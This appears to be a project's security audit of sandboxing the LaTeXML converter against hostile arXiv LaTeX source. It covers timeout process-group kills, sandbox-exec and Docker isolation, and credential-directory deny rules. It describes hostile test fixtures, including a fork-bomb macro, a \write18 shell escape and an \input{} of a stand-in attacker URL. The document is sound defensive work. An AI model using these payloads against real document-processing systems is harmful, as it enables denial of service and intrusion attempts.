# Threat-3 audit — LaTeXML sandbox on hostile input

**Threat source:** `.claude/notes/08-security-observability-ops.md` § Threat 3
(LaTeXML on hostile source).

**Milestone:** E13_S03 (Phase 1 of the Threat-3 mitigation — see below).

**Severity:** HIGH. A successful sandbox escape runs arbitrary code on the
developer workstation. LaTeX is Turing-complete, and arXiv source is
operator-supplied (TLS-verified but not author-trusted).

---

## Phasing — what E13_S03 ships TODAY vs. deferred

Threat 3 is mitigated in two phases. **E13_S03 ships Phase 1.** Phase 2
lands in E11 (production scale cutover) when the LaTeXML subprocess moves
from dev tooling (`tools/arxiv_fetch.py`) into the production ingest
pipeline.

| Phase | Mitigation | Where | Status |
|---|---|---|---|
| 1 | Python-level process-group kill on timeout — kills the entire process tree on `subprocess.TimeoutExpired`, not just the direct child | `tools/arxiv_fetch.py::parse_with_latexml` | ✅ E13_S03 |
| 1 | 5 hostile-fixture test corpus + containment test harness | `tests/security/fixtures/latexml/`, `tests/security/test_latexml_sandbox.py` | ✅ E13_S03 |
| 1 | macOS `sandbox-exec` profile (documentation artifact + test fixture; not wired into production code at v1) | `infra/latexml/sandbox.sb` | ✅ E13_S03 |
| 1 | Docker isolation config (standalone YAML; static-validated by test; merge into main compose when E14 lands it) | `infra/latexml/docker-compose.latexml.yml` | ✅ E13_S03 |
| 2 | `sandbox-exec` wired into `parse_with_latexml` on macOS production paths | TBD | ⏳ deferred — E11 |
| 2 | Linux seccomp+landlock filter in the ingest service | TBD | ⏳ deferred — E11 |
| 2 | Main docker-compose.yml with the LaTeXML service definition | `docker-compose.yml` | ⏳ deferred — E14 |
| 2 | Custom seccomp profiles for fine-grained syscall filtering on Linux | TBD | ⏳ documented future hardening |

The phasing is deliberate. Phase 1 fixes the cross-platform defense
(process-group kill) that the test suite needs to operate reliably. Phase
2 wires platform-specific containers and sandbox profiles once the
production ingest pipeline exists to wire them into.

---

## Defense layers (priority order)

1. **Process-group kill discipline** — on `subprocess.TimeoutExpired`, the
   entire process group is SIGKILL'd via `os.killpg(os.getpgid(proc.pid),
   SIGKILL)`. Without this, Perl helpers forked by `latexmlc` survive the
   kill of the direct child and continue consuming resources. The fix
   uses `subprocess.Popen(..., start_new_session=True)` to put the child
   in its own process group at fork time.

2. **Python-level timeout** — `LATEXML_TIMEOUT_SECONDS = 300` in
   `tools/arxiv_fetch.py`. This is the load-bearing kill mechanism. The
   LaTeXML `--timeout` flag exists but its ALRM-based mechanism is
   documented to surface ambiguously through the Perl error layer
   (GitHub issue #695); the Python-side `subprocess` timeout is more
   reliable.

3. **No `--shell-escape`** — `latexmlc` is invoked without a shell-escape
   flag. LaTeXML's Perl `\write18` implementation does NOT pass through
   to the shell (unlike pdflatex). The `write18_shellout.tex` fixture
   exercises this — see Fixture coverage below.

4. **macOS `sandbox-exec` profile** (deferred wiring; documented today).
   See `infra/latexml/sandbox.sb`. Status: deprecated on macOS but still
   functional. The replacement (App Sandbox via entitlements) requires
   code signing and is unsuitable for a dev-tool subprocess wrapper.

   **Credential-directory protection** (F1 + IS2 rectifications from
   adversary + infra-safety critiques): the profile does NOT grant
   blanket read access to `$HOME`. Explicit denies for
   `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/op`, `~/.netrc`,
   `~/.kube`, `~/.docker` precede a narrow allow for enumerated
   Perl/CPAN module roots (`~/perl5`, `~/.cpan`, `~/.cpanm`,
   `~/.perlbrew`, `~/.plenv`, `~/Library/Perl`). sandbox-exec
   applies rules in order; the deny-before-allow pattern means the
   credential paths are unreadable even if a future LaTeXML
   exploit chain attempts directory traversal.

5. **Docker isolation** (deferred wiring; documented today). See
   `infra/latexml/docker-compose.latexml.yml`. Encodes `network_mode:
   none`, `read_only: true`, `security_opt: no-new-privileges`,
   `user: 65534:65534` (nobody), `cap_drop: ALL`, memory/CPU caps,
   explicit `restart: "no"`, 512 MB tmpfs `/tmp`.

   **Resource-cap enforcement key** (IS1 rectification from
   infra-safety critique): the file uses TOP-LEVEL `mem_limit` and
   `cpus` for resource enforcement. The `deploy.resources.limits`
   block is also present for Swarm deployments but is silently
   ignored in standalone Docker Compose v1 / v2. The top-level
   keys are what actually enforce the caps in the standalone
   deployment path. Verified by
   `tests/security/test_latexml_sandbox.py::
   TestDockerLatexmlConfig::test_top_level_mem_limit_and_cpus`.

6. **Linux seccomp + landlock** — deferred to E11. Documented as future
   hardening.

---

## Fixture coverage

Five hostile `.tex` fixtures at `tests/security/fixtures/latexml/`:

| Fixture | Named threat | Effective against LaTeXML? | Test asserts |
|---|---|---|---|
| `infinite_recursion.tex` | Macro that calls itself unboundedly | ✅ yes — triggers LaTeXML expansion limit or Python timeout | Subprocess terminates within timeout; bounded elapsed |
| `write18_shellout.tex` | `\write18` shell escape attempt | ⚠️ **NO** — LaTeXML's `\write18` is silently ignored (no shell-escape support) | No canary file at `/tmp/arxmcp_pwned_e13s03.txt` (side-effect absence) |
| `fork_bomb.tex` | `\newcommand{\fb}{\fb\fb}\fb` — exponential expansion | ✅ yes — triggers OOM-kill or timeout | Subprocess terminates within timeout (or kernel OOM-kills it cleanly) |
| `large_alloc.tex` | Memory exhaustion via Perl heap (REDESIGNED — original brief specified Lua, which LaTeXML doesn't support) | ✅ yes — deeply-nested math triggers Perl heap allocations | Subprocess terminates within timeout |
| `network_call.tex` | `\input{http://attacker.example.invalid/payload.tex}` | ⚠️ **NO** — LaTeXML resolves `\input{}` as local file path, not HTTP fetch | No outbound socket connection attempted (monkeypatched `socket.connect`) AND subprocess terminates |

**Effectiveness caveats.** Two fixtures (`write18`, `network_call`) test
side-effect absence rather than attack-trigger because LaTeXML does not
implement the attack vectors as the brief assumed. They are still
load-bearing regression guards — if LaTeXML ever gains shell-escape or
HTTP-fetch capability, these tests will fire loudly.

The audit doc for E13_S04 (Threat 4 — resource exhaustion) will revisit
the `fork_bomb` and `large_alloc` cases with cgroup-level resource caps,
which is the structurally cleaner defense once Docker is wired in.

---

## Process-group kill discipline — implementation detail

The original `parse_with_latexml` used:

```python
proc = subprocess.run(cmd, ..., timeout=timeout)
```

On `TimeoutExpired`, `subprocess.run` calls `proc.kill()` which sends
SIGKILL to the **direct child only**. If LaTeXML has forked Perl
helpers (which it does for some operations), the grandchildren survive
as orphans under `init` and continue consuming resources.

The E13_S03 fix:

```python
proc = subprocess.Popen(cmd, ..., start_new_session=True)
try:
    proc.communicate(timeout=timeout)
except subprocess.TimeoutExpired:
    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    # ...drain pipes, re-raise
    raise
```

`start_new_session=True` causes the child to call `setsid()` after
fork, becoming the leader of a new session and process group. Any
descendants share the new PGID. On timeout, `killpg` SIGKILLs the
entire group atomically.

A regression test at
`tests/security/test_latexml_sandbox.py::TestProcessGroupKill` uses
AST-based static analysis to confirm `start_new_session=True` and
`killpg` are both present in `parse_with_latexml`. If a future
refactor removes either, the test fires.

---

## Fixture effectiveness — known LaTeXML limitations

### `\write18` is not pdflatex's `\write18`

LaTeXML is a Perl-based reimplementation of TeX's semantic layer, NOT a
wrapper around `pdflatex`. The `\write18` primitive in pdflatex passes
the argument to `system()` (the shell). LaTeXML's `\write18` is a Perl
stub that silently no-ops. The `write18_shellout.tex` fixture therefore
tests SIDE-EFFECT ABSENCE — after running, no canary file should appear.

If LaTeXML's behavior changes (or if a future replacement parser like
Tectonic is wired in with different `\write18` semantics), the canary
test fires.

### `\input{}` is not an HTTP fetcher

LaTeXML resolves `\input{filename}` as a local file path relative to
the source directory. It does NOT make HTTP requests for URL-shaped
arguments. The `network_call.tex` fixture's `\input{http://...}` is
treated as a "missing file" error. The fixture therefore tests
NETWORK-EGRESS ABSENCE via a monkeypatched `socket.connect` — if any
LaTeXML code path ever calls into Perl's `LWP::UserAgent` or similar,
the test fires loudly.

### LaTeXML is Perl, not LuaTeX

The original brief specified `large_alloc.tex` allocating "4 GB via a
custom Lua snippet." LaTeXML does NOT integrate with LuaTeX — a
`\directlua{}` block is silently ignored. The redesigned fixture uses
deeply-nested LaTeX math (`\underbrace` chains and array cells) to
exhaust LaTeXML's Perl heap. This produces the same containment test —
"subprocess terminates within timeout" — without depending on Lua.

---

## What the test suite does NOT cover

- **Subprocess escape via OS-level vulnerabilities.** A CVE in LaTeXML's
  Perl runtime that allows arbitrary code execution outside the
  `\write18` and `\input{}` surfaces is out of scope. Defense:
  pin LaTeXML version + sandbox-exec/seccomp/Docker isolation.
- **Network egress via DNS-over-HTTPS or DNS prefetch.** `--network=none`
  in Docker blocks all socket-level network. macOS `sandbox-exec`
  (`(deny network*)`) blocks the same surface. The Python-level
  monkeypatch in the `network_call` test covers in-process egress only.
- **Resource exhaustion at the host level.** A `fork_bomb` that uses
  100% CPU for the entire 300-second timeout window is a resource-
  exhaustion DOS, not a sandbox escape. Mitigation: cgroup CPU caps in
  Docker (`deploy.resources.limits.cpus`) and the Phase 2 production
  hardening. E13_S04 (Threat 4) is the dedicated milestone.
- **Compromised LaTeXML binary.** Out of scope; covered by Threat 6
  (model SHA pinning, dependency-pinning discipline) and E13_S06.

---

## Audit completion checklist

- [x] **AC1** — `pytest tests/security/test_latexml_sandbox.py` passes.
  Tests skip cleanly when `latexmlc` is not on PATH.
- [x] **AC2** — Each fixture: subprocess killed within the test timeout
  (10 s for unit tests; 300 s in production), no canary file appears
  in `/tmp/`.
- [~] **AC3** — Reframed: `infra/latexml/docker-compose.latexml.yml`
  documents `network_mode: none` and is static-validated by
  `TestDockerLatexmlConfig`. Full `docker inspect` verification
  deferred to E14 when the main compose lands.
- [~] **AC4** — Reframed: `infra/latexml/sandbox.sb` committed and
  static-validated by `TestSandboxProfile`. Not wired into production
  code at v1; runs via `make test` (no CI per CLAUDE.md §4.1).
- [~] **AC5** — Reframed: `ParseResult.success == False` rather than the
  fictional `parse_status="parse_failed"` field. Parser failures
  continue to be recorded in `var/arxmcp/ops/parser-failures/` per the
  existing schema in `ingest/bulk_ingest.py`.

---

## References

- `.claude/notes/08-security-observability-ops.md` § Threat 3 — primary threat-model source
- `tools/arxiv_fetch.py::parse_with_latexml` — invocation site, with the E13_S03 process-group fix
- `tests/security/test_latexml_sandbox.py` — containment test harness
- `tests/security/fixtures/latexml/*.tex` — 5 hostile fixtures
- `infra/latexml/sandbox.sb` — macOS sandbox-exec profile (deferred wiring)
- `infra/latexml/docker-compose.latexml.yml` — Docker isolation config (deferred wiring)
- E13_S01 audit: `.claude/docs/security-threat-1-audit.md` (Threat 1 precedent for audit-doc shape)
- E13_S02 audit: `.claude/docs/security-threat-2-audit.md` (Threat 2 precedent)
- USENIX LOGIN 2010 — Checkoway et al., "Don't Take LaTeX Files from Strangers" (attack-class background)
- `man sandbox-exec` — macOS profile syntax + deprecation status
- LaTeXML GitHub issue #695 — `--timeout` flag behavior
